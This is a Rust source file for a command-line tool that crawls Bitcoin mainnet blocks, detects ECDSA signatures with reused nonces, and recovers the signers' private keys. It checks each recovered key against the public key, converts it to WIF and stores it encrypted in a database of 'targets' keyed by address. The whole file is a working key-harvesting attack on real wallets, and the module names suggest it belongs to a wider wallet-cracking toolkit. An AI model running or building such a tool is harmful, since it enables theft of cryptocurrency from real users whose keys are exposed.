// Nonce Reuse Crawler CLI Command

use anyhow::{Context, Result};
use bitcoin::{Block, OutPoint, ScriptBuf, Transaction};
use bitcoincore_rpc::{Auth, Client, RpcApi};
use indicatif::{ProgressBar, ProgressStyle};
use std::collections::HashMap;
use std::path::PathBuf;
use std::time::Duration;
use temporal_planetarium_lib::scans::randstorm::forensics::recover_privkey_from_nonce_reuse;
use temporal_planetarium_lib::utils::db::{Target, TargetDatabase};
use temporal_planetarium_lib::utils::encryption::{encrypt_private_key, DEFAULT_ENCRYPTION_PASSPHRASE};
use tracing::{debug, error, info, warn};
use secp256k1::{PublicKey, Secp256k1};
use chrono::Utc;

#[derive(Debug, Clone)]
struct SignaturePoint {
    z: [u8; 32],
    r: [u8; 32],
    s: [u8; 32],
    txid: String,
    vin: usize,
    pubkey: Option<Vec<u8>>,
}

pub fn run(
    rpc_url: String,
    rpc_user: String,
    rpc_pass: String,
    db_path: PathBuf,
    start_block: Option<u64>,
    end_block: Option<u64>,
    resume: bool,
    passphrase: String,
) -> Result<()> {
    info!("🔍 Nonce Reuse Signature Detection Crawler");
    info!("🔗 RPC: {}", rpc_url);
    info!("💾 Database: {}", db_path.display());

    // Security warning if using default passphrase
    if passphrase == DEFAULT_ENCRYPTION_PASSPHRASE {
        warn!("⚠️  WARNING: Using default encryption passphrase. Set NONCE_CRAWLER_PASSPHRASE environment variable for production use.");
    }

    // Connect to Bitcoin Core RPC with retry logic
    let client = connect_with_retry(&rpc_url, &rpc_user, &rpc_pass, 3)?;

    let mut db = TargetDatabase::new(db_path.clone())
        .context("Failed to initialize database")?;

    // Determine block range
    let blockchain_info = client.get_blockchain_info()?;
    let current_height = blockchain_info.blocks;

    let (start_height, end_height) = if resume {
        let checkpoint_path = db_path.parent().unwrap().join("nonce_crawler_checkpoint.txt");
        let checkpoint = load_checkpoint(&checkpoint_path)?;
        (checkpoint + 1, end_block.unwrap_or(current_height))
    } else {
        let start = start_block.unwrap_or(current_height.saturating_sub(999));
        let end = end_block.unwrap_or(current_height);
        (start, end)
    };

    info!("📊 Scanning blocks {} to {}", start_height, end_height);

    let mut sig_map: HashMap<[u8; 32], SignaturePoint> = HashMap::new();

    // Progress bar
    let total_blocks = (end_height - start_height + 1) as u64;
    let progress = ProgressBar::new(total_blocks);
    progress.set_style(
        ProgressStyle::default_bar()
            .template("{spinner:.green} [{elapsed_precise}] [{wide_bar:.cyan/blue}] {pos}/{len} ({per_sec}, ETA: {eta})")
            .expect("Progress style")
            .progress_chars("#>-"),
    );

    let checkpoint_path = db_path.parent().unwrap().join("nonce_crawler_checkpoint.txt");
    let mut last_checkpoint = start_height;

    for height in start_height..=end_height {
        match scan_block(&client, height, &mut sig_map, &mut db, &passphrase) {
            Ok(collisions) => {
                if collisions > 0 {
                    info!("🔥 Block {}: Found {} collision(s)", height, collisions);
                }
            }
            Err(e) => {
                error!("❌ Error scanning block {}: {}", height, e);
            }
        }

        progress.inc(1);

        if height - last_checkpoint >= 100 {
            save_checkpoint(&checkpoint_path, height)?;
            last_checkpoint = height;
        }
    }

    save_checkpoint(&checkpoint_path, end_height)?;
    progress.finish_with_message("✅ Scan complete");

    info!("✨ Observed {} unique R-values", sig_map.len());
    Ok(())
}

fn connect_with_retry(url: &str, user: &str, pass: &str, max_retries: usize) -> Result<Client> {
    for attempt in 1..=max_retries {
        match Client::new(url, Auth::UserPass(user.to_string(), pass.to_string())) {
            Ok(client) => {
                if client.get_blockchain_info().is_ok() {
                    info!("✅ Connected to Bitcoin Core RPC");
                    return Ok(client);
                }
            }
            Err(_) => {}
        }
        if attempt < max_retries {
            warn!("⚠️  Retry attempt {}/{}", attempt, max_retries);
            std::thread::sleep(Duration::from_secs(2));
        }
    }
    Err(anyhow::anyhow!("Failed to connect after {} attempts", max_retries))
}

fn save_checkpoint(path: &PathBuf, height: u64) -> Result<()> {
    std::fs::create_dir_all(path.parent().unwrap())?;
    std::fs::write(path, height.to_string())?;
    debug!("💾 Checkpoint: block {}", height);
    Ok(())
}

fn load_checkpoint(path: &PathBuf) -> Result<u64> {
    if !path.exists() {
        return Err(anyhow::anyhow!("No checkpoint"));
    }
    let content = std::fs::read_to_string(path)?;
    let height = content.trim().parse()?;
    info!("📍 Resuming from block {}", height);
    Ok(height)
}

fn scan_block(
    client: &Client,
    height: u64,
    sig_map: &mut HashMap<[u8; 32], SignaturePoint>,
    db: &mut TargetDatabase,
    passphrase: &str,
) -> Result<usize> {
    let block_hash = client.get_block_hash(height)?;
    let block: Block = client.get_by_id(&block_hash)?;

    let mut collisions = 0;
    for tx in &block.txdata {
        collisions += process_transaction(client, tx, sig_map, db, passphrase)?;
    }
    Ok(collisions)
}

fn process_transaction(
    client: &Client,
    tx: &Transaction,
    sig_map: &mut HashMap<[u8; 32], SignaturePoint>,
    db: &mut TargetDatabase,
    passphrase: &str,
) -> Result<usize> {
    if tx.is_coinbase() {
        return Ok(0);
    }

    let mut collisions = 0;

    for (vin, input) in tx.input.iter().enumerate() {
        let script = &input.script_sig;
        if script.is_empty() {
            continue;
        }

        if let Some((r, s, pubkey)) = extract_signature(script.as_bytes()) {
            let prevout_script = match fetch_prevout(client, &input.previous_output) {
                Ok(s) => s,
                Err(_) => continue,
            };

            let z = match compute_sighash(tx, vin, &prevout_script) {
                Ok(z) => z,
                Err(_) => continue,
            };

            if let Some(existing) = sig_map.get(&r) {
                if existing.s != s {
                    collisions += 1;
                    warn!("🔥 NONCE REUSE: R={}", hex::encode(r));

                    if let Err(e) = recover_and_store(existing, &z, &r, &s, &pubkey, db, passphrase) {
                        error!("Recovery failed: {}", e);
                    }
                }
            } else {
                sig_map.insert(r, SignaturePoint {
                    z,
                    r,
                    s,
                    txid: tx.compute_txid().to_string(),
                    vin,
                    pubkey: Some(pubkey),
                });
            }
        }
    }

    Ok(collisions)
}

fn extract_signature(script: &[u8]) -> Option<([u8; 32], [u8; 32], Vec<u8>)> {
    let der_start = script.iter().position(|&b| b == 0x30)?;
    if script.len() <= der_start + 2 {
        return None;
    }

    let sig_len = script[der_start + 1] as usize;
    if script.len() < der_start + 2 + sig_len {
        return None;
    }

    let der = &script[der_start + 2 .. der_start + 2 + sig_len];
    let (r, s) = parse_der(der).ok()?;

    let pubkey_start = der_start + 2 + sig_len + 1;
    if script.len() <= pubkey_start {
        return None;
    }

    let pubkey_len = script[pubkey_start] as usize;
    let pubkey_start = pubkey_start + 1;
    if script.len() < pubkey_start + pubkey_len {
        return None;
    }

    let pubkey = script[pubkey_start .. pubkey_start + pubkey_len].to_vec();
    Some((r, s, pubkey))
}

fn parse_der(der: &[u8]) -> Result<([u8; 32], [u8; 32])> {
    if der.len() < 8 || der[0] != 0x02 {
        return Err(anyhow::anyhow!("Invalid DER"));
    }

    let r_len = der[1] as usize;
    let r_start = 2;
    if der.len() < r_start + r_len + 2 || der[r_start + r_len] != 0x02 {
        return Err(anyhow::anyhow!("Invalid R"));
    }

    let s_len = der[r_start + r_len + 1] as usize;
    let s_start = r_start + r_len + 2;
    if der.len() < s_start + s_len {
        return Err(anyhow::anyhow!("Invalid S"));
    }

    let r = pad_32(&der[r_start .. r_start + r_len]);
    let s = pad_32(&der[s_start .. s_start + s_len]);
    Ok((r, s))
}

fn pad_32(bytes: &[u8]) -> [u8; 32] {
    let mut res = [0u8; 32];
    let len = bytes.len().min(32);
    let start = if bytes.len() > 32 { bytes.len() - 32 } else { 0 };
    let dest = 32 - len;
    res[dest..].copy_from_slice(&bytes[start..start+len]);
    res
}

fn fetch_prevout(client: &Client, outpoint: &OutPoint) -> Result<ScriptBuf> {
    let tx = client.get_raw_transaction(&outpoint.txid, None)?;
    let vout = outpoint.vout as usize;
    if vout >= tx.output.len() {
        return Err(anyhow::anyhow!("Invalid vout"));
    }
    Ok(tx.output[vout].script_pubkey.clone())
}

fn compute_sighash(tx: &Transaction, idx: usize, script: &ScriptBuf) -> Result<[u8; 32]> {
    use bitcoin::sighash::{SighashCache, EcdsaSighashType};
    use bitcoin::hashes::Hash;
    let mut cache = SighashCache::new(tx);
    let hash = cache.legacy_signature_hash(idx, script, EcdsaSighashType::All.to_u32())?;
    Ok(hash.to_byte_array())
}

fn recover_and_store(
    sig1: &SignaturePoint,
    z2: &[u8; 32],
    r: &[u8; 32],
    s2: &[u8; 32],
    pubkey2: &[u8],
    db: &mut TargetDatabase,
    passphrase: &str,
) -> Result<()> {
    let secret = recover_privkey_from_nonce_reuse(&sig1.z, z2, r, &sig1.s, s2)?;

    let secp = Secp256k1::new();
    let recovered_pk = PublicKey::from_secret_key(&secp, &secret);
    let expected_pk = PublicKey::from_slice(pubkey2)?;

    if recovered_pk != expected_pk {
        return Err(anyhow::anyhow!("Key mismatch"));
    }

    info!("✅ Key recovery validated");

    let wif = bitcoin::PrivateKey::new(secret, bitcoin::Network::Bitcoin).to_wif();
    let encrypted = encrypt_private_key(&wif, passphrase)?;

    let address = if pubkey2.len() == 33 {
        let cpk = bitcoin::key::CompressedPublicKey::from_slice(pubkey2)?;
        bitcoin::Address::p2pkh(cpk, bitcoin::Network::Bitcoin).to_string()
    } else {
        format!("recovered_{}", hex::encode(&pubkey2[0..20]))
    };

    let metadata = serde_json::json!({
        "vulnerability": "ecdsa_nonce_reuse",
        "shared_r_value": hex::encode(r),
        "recovery_date": Utc::now().to_rfc3339(),
        "validation": "confirmed"
    });

    let target = Target::with_encrypted_key(
        address.clone(),
        "nonce_reuse".to_string(),
        Some(metadata.to_string()),
        encrypted.ciphertext,
        encrypted.nonce,
        encrypted.salt,
    );

    db.upsert_target(&target)?;
    info!("💾 Stored encrypted key for {}", address);

    Ok(())
}
